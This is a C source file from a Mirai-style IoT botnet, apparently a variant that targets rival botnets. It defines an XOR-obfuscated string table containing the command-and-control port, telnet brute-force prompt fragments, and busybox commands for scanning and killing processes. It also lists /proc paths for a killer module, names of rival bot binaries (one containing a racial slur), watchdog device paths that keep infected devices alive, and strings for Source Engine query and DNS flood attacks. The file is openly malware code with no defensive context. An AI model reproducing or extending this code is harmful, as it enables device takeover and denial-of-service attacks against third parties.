#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xbaadf00d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\xAF\x7F", 2); // 17813
    add_entry(TABLE_SCAN_CB_PORT, "\x29\xBA", 2); // 50000
    add_entry(TABLE_EXEC_SUCCESS, "\xB9\x8F\x8D\x87\x8F\x84\x9E\x8B\x9E\x83\x85\x84\xCA\xAC\x8B\x9F\x86\x9E\xCA\xC2\x89\x85\x98\x8F\xCA\x8E\x9F\x87\x9A\x8F\x8E\xC3\xC4\xEA", 34); // Segmentation Fault (core dumped).

    add_entry(TABLE_SCAN_SHELL, "\x99\x82\x8F\x86\x86\xEA", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x8F\x84\x8B\x88\x86\x8F\xEA", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x99\x93\x99\x9E\x8F\x87\xEA", 7); // system
    add_entry(TABLE_SCAN_SH, "\x99\x82\xEA", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\xA5\xA7\xA4\xA3\xEA", 18); // /bin/busybox OMNI
    add_entry(TABLE_SCAN_RESP, "\xA5\xA7\xA4\xA3\xD0\xCA\x8B\x9A\x9A\x86\x8F\x9E\xCA\x84\x85\x9E\xCA\x8C\x85\x9F\x84\x8E\xEA", 23); // OMNI: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x84\x89\x85\x98\x98\x8F\x89\x9E\xEA", 9); // ncorrect
    add_entry(TABLE_SCAN_PS, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\x9A\x99\xEA", 16); // /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\x81\x83\x86\x86\xCA\xC7\xD3\xEA", 22); // /bin/busybox kill -9
    add_entry(TABLE_SCAN_OGIN, "\x85\x8D\x83\x84\xEA", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x8F\x84\x9E\x8F\x98\xEA", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8); // assword
	
    add_entry(TABLE_KILLER_PROC, "\xC5\x9A\x98\x85\x89\xC5\xEA", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\xC5\x8F\x92\x8F\xEA", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\xC5\x8C\x8E\xEA", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\xC5\x87\x8B\x9A\x99\xEA", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x9E\x89\x9A\xEA", 14); // /proc/net/tcp

    add_entry(TABLE_EXEC_MIRAI, "\x8E\x9C\x98\xA2\x8F\x86\x9A\x8F\x98\xEA", 10); // dvrHelper
    add_entry(TABLE_EXEC_SORA1, "\xA4\x83\xAD\xAD\x8F\xB8\xDC\xD3\x92\x8E\xEA", 11); // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA2, "\xDB\xD9\xD9\xDD\xB9\x85\x98\x8B\xA6\xA5\xAB\xAE\xAF\xB8\xEA", 15); // 1337SoraLOADER
	add_entry(TABLE_EXEC_SORA3, "\xA4\x83\xAD\xAD\x8F\xB8\x8E\xDA\x84\x81\x99\xDB\xD9\xD9\xDD\xEA", 16); // NiGGeRd0nks1337
    add_entry(TABLE_EXEC_OWARI, "\xB2\xDB\xD3\xA3\xD8\xD9\xD3\xDB\xD8\xDE\xBF\xA3\xBF\xEA", 14); // X19I239124UIU
	add_entry(TABLE_EXEC_OWARI2, "\xA3\x9F\xB3\x8D\x9F\x80\x8F\xA3\x9B\x84\xEA", 11); // IuYgujeIqn
    add_entry(TABLE_EXEC_JOSHO, "\xDB\xDE\xAC\x8B\xEA", 5); // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x89\x89\xAB\xAE\xEA", 5); // ccAD

    add_entry(TABLE_IOCTL_KEEPALIVE1, "\xC5\x8E\x8F\x9C\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 14); // /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\xC5\x8E\x8F\x9C\xC5\x87\x83\x99\x89\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 19); // /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB6\xCA\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 24); // /dev/FTWDT101\ watchdog
	
    add_entry(TABLE_RANDOM, "\x90\xAC\xAC\xB9\xD3\x93\x88\x84\xDA\xA9\x89\x87\x8B\xDC\x84\xA9\xA7\xD3\xD8\xBD\x82\xA6\xB0\xA3\x9D\x8D\xAB\x87\xB0\x9E\xA2\xD2\x9B\xBD\x90\xDB\x9C\x9C\xBE\xAD\xA0\xA2\xA0\x9E\xAF\xBF\xD9\x86\xAE\xD2\xDD\x89\xA3\xBC\xB2\xB8\xDC\xA7\xA7\xD3\x87\xDA\xD2\xBA\xEA", 65); // zFFS9ybn0Ccma6nCM92WhLZIwgAmZtH8qWz1vvTGJHJtEU3lD87cIVXR6MM9m08P
	
	add_entry(TABLE_ATK_VSE, "\xBE\xB9\x85\x9F\x98\x89\x8F\xCA\xAF\x84\x8D\x83\x84\x8F\xCA\xBB\x9F\x8F\x98\x93\xEA", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\xC5\x8F\x9E\x89\xC5\x98\x8F\x99\x85\x86\x9C\xC4\x89\x85\x84\x8C\xEA", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", 11); // nameserver
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

